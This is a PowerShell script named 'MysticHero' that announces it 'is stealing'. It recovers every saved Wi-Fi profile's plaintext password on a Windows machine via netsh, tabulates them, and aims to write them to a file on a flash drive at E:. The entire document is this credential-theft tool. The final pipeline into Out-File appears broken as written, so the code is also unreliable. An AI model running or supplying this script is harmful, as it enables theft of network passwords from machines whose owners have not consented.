$host.UI.RawUI.WindowTitle = "MysticHero" 
if ($PSUICulture -eq "ru-RU") {
    $Strings = @("Все профили пользователей", "Содержимое ключа")
} else {
    $Strings = @("All User Profile", "Key Content")
}

Write-Host "MysticHero is stealing, please wait"
$WiFiNames = netsh wlan show profiles | Select-String $Strings[0] | ForEach-Object { $_ -replace "$($Strings[0])\s+:\s+", "" }
$WiFiPasswords = @()

foreach ($WiFi in $WiFiNames) {
    $password = (netsh wlan show profile name="$($WiFi.Trim())" key=clear) -match $Strings[1]
    $WiFiPasswords += New-Object PSObject -Property @{
        SSID = $WiFi.Trim()
        Password = & {
            param($Password)
            if ($Password) {
                $password.Trim() -replace "$($Strings[1])\s+:\s+", ""
            } else {
                "No password"
            }
        } $password
    }
}

$WiFiPasswords | Format-Table SSID, Password | # Defines the permanent location on your flash drive (E:\)
$FlashPath = "E:\MysticHero.txt" 

# Writes the content of your PowerShell pipeline to E:\MysticHero.txt
Out-File -FilePath $FlashPath 

# Opens the file from the permanent location on the E: drive
notepad $FlashPath
